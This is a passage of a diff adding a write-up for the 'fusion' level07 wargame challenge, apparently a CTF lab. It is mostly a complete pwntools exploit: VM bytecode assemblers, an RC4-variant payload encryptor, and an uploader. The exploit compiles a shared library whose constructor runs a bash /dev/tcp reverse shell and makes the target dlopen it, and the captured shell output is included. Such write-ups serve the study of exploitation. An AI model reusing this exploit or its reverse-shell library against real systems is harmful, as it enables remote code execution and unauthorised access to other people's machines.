+    bcode += vm_push(p32(srclen))
+    bcode += p8(0x23)
+    return bcode
+
+def vm_dlopen(path):
+    bcode =  bytearray()
+    bcode += vm_push_str_addr(path)
+    bcode += p8(0x4d)
+    return bcode
+
+def vm_writewhatwhere():
+    bcode =  bytearray()
+    bcode += p8(0xb0)
+    return bcode
+
+def vm_unregister_cmd(opcode):
+    bcode =  bytearray()
+    bcode += vm_push(p32(opcode))
+    bcode += p8(0x95)
+    return bcode
+
+def vm_dlsym(symbol_name):
+    bcode =  bytearray()
+    bcode += vm_push_str_addr(symbol_name)
+    bcode += p8(0xb4)
+    return bcode
+```
+- they should be clear enough if you consider the description of the vm's opcode above.
+- ok so we made a byte code for the vm , now how do we deliver it ?,  first we need a function function to encrypt a payload that will be decrypted by `decrypt_pak`  :
+```python
+def rc4_plus(key):
+    key[0] = (key[0]+1) & 0xff
+    i = key[key[0]+2] 
+    key[1] = (key[1] + i) & 0xff
+    j = key[key[1] + 2] 
+    key[key[1] + 2] = i
+    key[key[0]+2] = j
+    return key[(((key[1] + key[((i+j) &0xff) +2])^j) & 0xff)+2]
+
+def rc4_plus_setup(keyseed,keyseed_len):
+    random_index = 0
+    key = bytearray(258)
+    key[0]=0
+    key[1]=0
+    for i in range(0x100):
+        key[i+2]=i
+
+    for j in range(0x300):
+        random_index =  (key[random_index + 2] 
+                         + random_index 
+                         + keyseed[(j & 0xff )% keyseed_len]) % 0x100
+        keychar_tmp = key[(j & 0xff)+2]
+        key[(j & 0xff)+2] = key[random_index+2]
+        key[random_index+2] = keychar_tmp
+
+    for i in range(0x200):
+        rc4_plus(key)
+    return key
+
+
+
+def encrypt_pakfile(pakfile,keyseed,keyseed_len):
+    print("[ENCRYPTING PAKFILE]\n")
+    pakfile_encrypted = bytearray(len(pakfile))
+    key = rc4_plus_setup(keyseed,keyseed_len)
+    for i in range(len(pakfile)):
+        keychar = rc4_plus(key)
+        pakfile_encrypted[i] = pakfile[i] ^ keychar
+    pakfile_encrypted =keyseed + pakfile_encrypted 
+    return pakfile_encrypted
+```
+- since the decryption process works by `XOR`ing the `pakfile` with the `rc4` steam (which is initialized by the key seed we provide), i will just do the same with a key of my own , then provide that key in the payload so it will be used by the server as well, and when the data will be `XOR`ed in the sever it'll be back to its original state , decrypted.
+- i started by implementing the `rc4_plus_setup` and `rc4_plus` functions so I can get the key stream from my key seed and `XOR` the payload with it .
+- then i write the implementation function to do exactly that , it used the `rc4` functions (identical to the C ones we reversed) to get the steam and `XOR` with it
+
+- but there is another layer of encryption , or obfuscation , before the data is even passed to `parse_pak` to be decrypted , it is kind of encoded by `XOR`ing it with the we provide and that is put in the `pa` struct (see the analysis of `load_new_pakfile` above).
+- so after encrypting the payload with `rc4` we need to encrypt it a second time by `XOR`ing it with the key that we provide to the `pa` structure, here is the function that encrypts , encodes and uploads a `pakfile` payload:
+```python
+def upload_pakfile(pakfile) :
+    l = listen(upload_port)
+    # print(f"pakfile : \n{pakfile}\n\n")
+    pakfile_encrypted = encrypt_pakfile(pakfile,keyseed,keyseed_len)
+    # print(f"encrypted pakfile : \n{pakfile_encrypted}\n\n")
+    pakfile_encoded = bytearray(len(pakfile_encrypted))
+    # print(f"encoded pakfile : \n{pakfile_encoded}\n\n")
+#the pa structure read in mainso 
+#so it could connect and download 
+#th pakfile'''
+    pa_buf = b''
+    pa_buf+=p32(new_pak_opcode)
+    pa_buf+=my_local_ip.encode()
+    pa_buf+=b'|'
+    pa_buf+=str(upload_port).encode()
+    pa_buf+=b'|'
+    pa_buf+=key
+
+
+#for the line :
+#    if(pth_read(fd, &alloc, sizeof(alloc)) != sizeof(alloc)) goto closefd;'''
+    length = len(pakfile_encrypted)
+
+#xoring the pakfile with the key 
+    keyind = 0
+    print("[ENCODING PAKFILE]\n")
+    for i in range(length):
+        pakfile_encoded[i]=pakfile_encrypted[i] ^ key[keyind]
+        keyind = (keyind+1) % keylen
+
+#sending the pa buffer 
+    inst = remote(serverip,port,typ="udp")
+    # print(f"sending pa_buf : \n{pa_buf}\n\n")
+    inst.send(pa_buf)
+#the challenge should connect to us now on the upload port
+    upload_conection = l.wait_for_connection()
+    # print("connection succeeded")
+    upload_conection.send(p32(length))
+    # print(f"length sent : \n{length}\n\n")
+    print("[UPLOADING PAKFILE]\n")
+    upload_conection.send(pakfile_encoded)
+    inst.close()
+    upload_conection.close()
+```
+
+
+- congrats , now we can communicate with the vm , after some runtime testing in `gdb` , i made sure our `pakfile` reaches the vm intact now that remains is the exploit strategy and the exploit itself.
+
+## Exploit strategy
+- it may come to your surprise , dear reader , that the Write-What-Where is kind of worthless in this challenge , this is because the program never communicates back to the client , but to write somewhere you should know the address , you cannot get any meaningful location address by manipulating the vm opcodes either , so that was an anti-climax
+- the good new is that the exploit is really clever , we have the ability to write a `library` to a specific path in the vm via the opcode 0x23 which I abstracted by the function `vm_write_lib` so you just provide the path , payload and length to that and it does the rest , we also have the ability to LOAD the library with another opcode , which is also abstracted by my `vm_dlopen` function ,which takes the path to the library in the fusion vm and makes the challenge load it.
+- what we want to do is craft a library that has a malicious `constructor` , this is wild but there are blobs of code in a c library that are executed by the elf loader when the library is loaded , no need for any call primitive , so what we are gonna do is that we will make a lib that has only a `constructor` that gives us a reverse shell , then we are gonna write the library to `/tmp/malicious.so` in the fusion vm , and then load it and congratz , a reverse shell !.
+- but we still have yet some `XOR`ing to do , after reversing `write_lib` , i got :
+```c
+
+int write_lib(char *path,char *src,uint lengtht)
+
+{
+  int fd;
+  uint write_ret;
+  uint i;
+  
+  for (i = 0; i < lengtht; i = i + 1) {
+    src[i] = src[i] ^ 0xa5;
+  }
+  fd = open(path,0x241,0x1c0);
+  if (fd == -1) {
+    fd = -1;
+  }
+  else {
+    write_ret = write(fd,src,lengtht);
+    if (write_ret == lengtht) {
+      close(fd);
+      fd = 0;
+    }
+    else {
+      close(fd);
+      fd = -1;
+    }
+  }
+  return fd;
+}
+```
+- as you can see before writing to the specified path , the content of the library is `XOR`ed with the value 0xa5 byte by byte , we have to do the same operation before sending the library , so it is double `XOR`ed and is written like the original library 
+- here is the code i wrote to create, compile , and `XOR` the library :
+```python
+reverse_shell = 'bash -i >& /dev/tcp/'+my_local_ip+'/1666 <&1'
+
+malicious_lib_code = f'''
+#include <stdlib.h>
+__attribute__((constructor))
+void init() {{ 
+              system("{reverse_shell}"); 
+              }}
+void main(){{return;}}'''
+
+with open("./malicious.c",'w') as malicious:
+    malicious.write(malicious_lib_code)
+    malicious.close()
+
+#compile the lib
+subprocess.run("gcc -m32 -shared -fPIC malicious.c -o malicious.so", shell=True)
+
+with open("./malicious.so",'rb') as malicious:
+    malicious_lib = bytearray()
+    malicious_lib += malicious.read()
+    malicious.close()
+
+malicious_lib_len = len(malicious_lib)
+for i in range(malicious_lib_len):
+    malicious_lib[i] = malicious_lib[i] ^ 0xa5
+
+```
+- now that we can do everything we should do in order to send the library , load it and get a shell , let's just do that !
+## The exploit 
+- here is the entire exploit :
+```python
+#!/usr/bin/python3
+#!/usr/bin/python3
+from pwn import *
+context.log_level='critical'
+
+serverip = 'redacted'
+my_local_ip = 'redacted'
+port = 20007
+
+
+upload_port = 1337
+revshell_port = 1666
+
+new_pak_opcode = 1347961165
+keyseed = bytearray()
+keyseed += 0x20*b'\xff'
+keyseed_len = len(keyseed)
+key = bytearray()
+key += b'hardcode'
+keylen=len(key)
+malicious_lib_path = b"/tmp/malicious.so"
+reverse_shell = 'bash -i >& /dev/tcp/'+my_local_ip+'/1666 <&1'
+processarr = ['nc','-v',"-lp" ,'1666'] 
+shell = process(processarr)
+
+def testshell(p):
+    #flush
+    p.recv(timeout=3)
+    p.sendline(b'echo congratz?\n')
+    sleep(2)
+    resp = p.recv(timeout=3)
+    if  b'congratz?' in resp:
+        print("\ncongratz!\n")
+        p.interactive()
+    p.close()
+    return False
+
+#implementing vm  assember
+def vm_ret():
+    return p8(0x70)
+
+def vm_nop():
+    return p8(0x18)
+
+def vm_push_base():
+    return p8(0x31)
+
+def vm_push(val):
+    bcode =  b''
+    bcode += p8(0xaf)
+    #fillers
+    bcode += 2*p8(0xff)
+    bcode += val
+
+    return bcode
+
+def vm_sub():
+    return p8(0x46)
+
+def vm_push_str_addr(stringbytes):
+    length = len(stringbytes)
+    bcode =  b''
+    bcode += p8(0xea)
+    bcode += p16(length)
+    bcode += stringbytes
+    return bcode
+
+def vm_writelib(path,src,srclen):
+    bcode =  b''
+    bcode += vm_push_str_addr(path)
+    bcode += vm_push_str_addr(src)
+    bcode += vm_push(p32(srclen))
+    bcode += p8(0x23)
+    return bcode
+
+def vm_dlopen(path):
+    bcode =  bytearray()
+    bcode += vm_push_str_addr(path)
+    bcode += p8(0x4d)
+    return bcode
+
+def vm_writewhatwhere():
+    bcode =  bytearray()
+    bcode += p8(0xb0)
+    return bcode
+
+def vm_unregister_cmd(opcode):
+    bcode =  bytearray()
+    bcode += vm_push(p32(opcode))
+    bcode += p8(0x95)
+    return bcode
+
+def vm_dlsym(symbol_name):
+    bcode =  bytearray()
+    bcode += vm_push_str_addr(symbol_name)
+    bcode += p8(0xb4)
+    return bcode
+
+
+
+    
+def rc4_plus(key):
+    key[0] = (key[0]+1) & 0xff
+    i = key[key[0]+2] 
+    key[1] = (key[1] + i) & 0xff
+    j = key[key[1] + 2] 
+    key[key[1] + 2] = i
+    key[key[0]+2] = j
+    return key[(((key[1] + key[((i+j) &0xff) +2])^j) & 0xff)+2]
+
+def rc4_plus_setup(keyseed,keyseed_len):
+    random_index = 0
+    key = bytearray(258)
+    key[0]=0
+    key[1]=0
+    for i in range(0x100):
+        key[i+2]=i
+
+    for j in range(0x300):
+        random_index =  (key[random_index + 2] 
+                         + random_index 
+                         + keyseed[(j & 0xff )% keyseed_len]) % 0x100
+        keychar_tmp = key[(j & 0xff)+2]
+        key[(j & 0xff)+2] = key[random_index+2]
+        key[random_index+2] = keychar_tmp
+
+    for i in range(0x200):
+        rc4_plus(key)
+    return key
+
+
+
+def encrypt_pakfile(pakfile,keyseed,keyseed_len):
+    print("[ENCRYPTING PAKFILE]\n")
+    pakfile_encrypted = bytearray(len(pakfile))
+    key = rc4_plus_setup(keyseed,keyseed_len)
+    for i in range(len(pakfile)):
+        keychar = rc4_plus(key)
+        pakfile_encrypted[i] = pakfile[i] ^ keychar
+    pakfile_encrypted =keyseed + pakfile_encrypted 
+    return pakfile_encrypted
+
+#uploading a pakfile to be decoded by download_new_pak
+def upload_pakfile(pakfile) :
+    l = listen(upload_port)
+    # print(f"pakfile : \n{pakfile}\n\n")
+    pakfile_encrypted = encrypt_pakfile(pakfile,keyseed,keyseed_len)
+    # print(f"encrypted pakfile : \n{pakfile_encrypted}\n\n")
+    pakfile_encoded = bytearray(len(pakfile_encrypted))
+    # print(f"encoded pakfile : \n{pakfile_encoded}\n\n")
+#the pa structure read in mainso 
+#so it could connect and download 
+#th pakfile'''
+    pa_buf = b''
+    pa_buf+=p32(new_pak_opcode)
+    pa_buf+=my_local_ip.encode()
+    pa_buf+=b'|'
+    pa_buf+=str(upload_port).encode()
+    pa_buf+=b'|'
+    pa_buf+=key
+
+
+#for the line :
+#    if(pth_read(fd, &alloc, sizeof(alloc)) != sizeof(alloc)) goto closefd;'''
+    length = len(pakfile_encrypted)
+
+#xoring the pakfile with the key 
+    keyind = 0
+    print("[ENCODING PAKFILE]\n")
+    for i in range(length):
+        pakfile_encoded[i]=pakfile_encrypted[i] ^ key[keyind]
+        keyind = (keyind+1) % keylen
+
+#sending the pa buffer 
+    inst = remote(serverip,port,typ="udp")
+    # print(f"sending pa_buf : \n{pa_buf}\n\n")
+    inst.send(pa_buf)
+#the challenge should connect to us now on the upload port
+    upload_conection = l.wait_for_connection()
+    # print("connection succeeded")
+    upload_conection.send(p32(length))
+    # print(f"length sent : \n{length}\n\n")
+    print("[UPLOADING PAKFILE]\n")
+    upload_conection.send(pakfile_encoded)
+    inst.close()
+    upload_conection.close()
+
+
+
+
+print("[crafting malicious library]\n")
+
+malicious_lib_code = f'''
+#include <stdlib.h>
+__attribute__((constructor))
+void init() {{ 
+              system("{reverse_shell}"); 
+              }}
+void main(){{return;}}'''
+
+with open("./malicious.c",'w') as malicious:
+    malicious.write(malicious_lib_code)
+    malicious.close()
+
+#compile the lib
+subprocess.run("gcc -m32 -shared -fPIC malicious.c -o malicious.so", shell=True)
+
+with open("./malicious.so",'rb') as malicious:
+    malicious_lib = bytearray()
+    malicious_lib += malicious.read()
+    malicious.close()
+
+malicious_lib_len = len(malicious_lib)
+for i in range(malicious_lib_len):
+    malicious_lib[i] = malicious_lib[i] ^ 0xa5
+
+print("[ASSEMBLING CODE FOR CUSTOM VM]\n")
+pakfile = bytearray()
+pakfile += vm_writelib(malicious_lib_path,malicious_lib,malicious_lib_len)
+pakfile += vm_ret()
+upload_pakfile(pakfile)
+sleep(3)
+pakfile = bytearray()
+pakfile += vm_dlopen(malicious_lib_path)
+pakfile += vm_ret()
+upload_pakfile(pakfile)
+print("[WAITING FOR SHELL]\n")
+sleep(10)
+testshell(shell)
+shell.interactive()
+```
+- testing this gives :
+```bash
+❯ ./level07_exploit.py
+[crafting malicious library]
+
+[ASSEMBLING CODE FOR CUSTOM VM]
+
+[ENCRYPTING PAKFILE]
+
+[ENCODING PAKFILE]
+
+[UPLOADING PAKFILE]
+
+[ENCRYPTING PAKFILE]
+
+[ENCODING PAKFILE]
+
+[UPLOADING PAKFILE]
+
+[WAITING FOR SHELL]
+
+
+congratz!
+
+$ ls
+ls
+bin
+boot
+cdrom
+dev
+etc
+home
+initrd.img
+initrd.img.old
+lib
+media
+mnt
+opt
+proc
+rofs
+root
+run
+sbin
+selinux
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+I have no name!@fusion:/$ $
+```
+
+# and voila.
